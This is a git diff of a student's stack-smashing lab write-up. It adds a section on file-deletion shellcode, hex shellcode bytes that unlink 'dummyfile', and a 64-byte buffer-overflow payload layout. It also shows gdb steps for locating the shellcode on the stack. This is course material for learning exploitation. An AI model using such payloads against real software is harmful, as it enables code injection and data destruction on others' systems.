@@ -1,4 +1,4 @@
-
+![image](https://github.com/hoag142/myprojects/assets/152377486/9c376f9d-3f46-4952-95ec-153dd9db31e7)
 
 # 22110029, Trần Huy Hoàng
 # lab 1 Stack smashing
@@ -110,10 +110,56 @@ And insert this address to func pointer with payload is 128 char `a` and `0x0804
 
 
 ## task 2
-### preparing shell code
- Creating `file_del.asm`
+### 2.1 preparing shell code
+ Creting `file_del.asm`
  
- ![image](https://github.com/hoag142/myprojects/assets/152377486/d6119185-6b06-4e4a-867c-98d3477cd97c)
+![image](https://github.com/hoag142/myprojects/assets/152377486/ee682e6d-618e-4e43-a3fc-798339f45814)
+
+Write shellcode program in assembly language (file_del.asm), compile with nasm (file_del.o) then link with ld to generate executable file (file_del)
+
+![image](https://github.com/hoag142/myprojects/assets/152377486/6fc401a0-8a30-480a-aa66-a3c7a263ca57)
+![image](https://github.com/hoag142/myprojects/assets/152377486/69a47839-5ffc-4229-a63d-c6c425e775f3)
+![image](https://github.com/hoag142/myprojects/assets/152377486/4810a46e-19c8-4075-ac08-4199329d7ffc)
+
+### 2.2 Preparing the payload
+
+![image](https://github.com/hoag142/myprojects/assets/152377486/6fdb9204-263a-4f7a-8cec-0c90ff3a27fc)
+
+Generate Hex String: `\xeb\x13\xb8\x0a\x00\x00\x00\xbb\x9a\x00\x40\x00\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65`
+
+buffer size : `64`
+
+
+My payload would be : 'a' * 64 + `\xeb\x13\xb8\x0a\x00\x00\x00\xbb\x9a\x00\x40\x00\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65` + `\xff\xff\xff\xff`
+
+
+### 2.3 Code injection
+
+![image](https://github.com/hoag142/myprojects/assets/152377486/2e2447a7-ff5f-488a-bdae-81eed4587996)
+
+Run gdb
+
+run `disas main` determine address after `strcpy`
+
+![image](https://github.com/hoag142/myprojects/assets/152377486/adae13c3-46c4-400d-9c49-a8bcd99b262d)
+
+breakpoint :`0x08048468`
+
+set breakpoint `b *0x08048468`
+
+![image](https://github.com/hoag142/myprojects/assets/152377486/093f9475-4e16-4638-bb7d-067a00495aa3)
+
+Run with payload and Watch the stack memory from esp
+
+![image](https://github.com/hoag142/myprojects/assets/152377486/bf2efe4c-07f2-4f79-afd0-b08407b12231)
+
+This indicates that your shellcode begins at address `0xffffd708`.
+
+
+
+
+
+
 
 
 
